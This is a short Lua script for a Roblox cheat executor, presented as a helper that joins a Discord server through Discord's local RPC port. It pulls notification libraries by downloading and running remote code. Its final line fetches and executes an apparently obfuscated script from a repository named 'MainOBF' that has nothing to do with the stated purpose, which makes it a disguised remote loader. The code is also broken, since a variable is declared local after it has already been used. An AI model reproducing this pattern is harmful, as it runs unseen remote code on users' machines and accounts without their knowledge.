if syn and syn.request then
	RequestFunction = syn.request
elseif request then
	RequestFunction = request
elseif http and http.request then
	RequestFunction = http.request
elseif http_request then
	RequestFunction = http_request
end

if not RequestFunction then
	return game.Players.LocalPlayer:Kick("Your executor does not support http requests.")
end

local HttpService = game:GetService("HttpService")
local DiscordAPI = "http://127.0.0.1:6463/rpc?v=1"
local RequestFunction

local Librarys = {
	Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/Jxereas/UI-Libraries/main/notification_gui_library.lua", true))(),
	MessageBox = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/NotificationGUI/main/source.lua"))()
}

local inviteinfo = Librarys.Notification.new("info", "Info", "Info Body Message")
inviteinfo:changeHeading("Joining Discord Server...")
inviteinfo:changeBody("Discord Server Code: " .. _G.Config.InviteCode)
inviteinfo:deleteTimeout(5)
wait(0.2)
loadstring(game:HttpGet("https://raw.githubusercontent.com/kyuoso/MainOBF/main/1.lua"))()
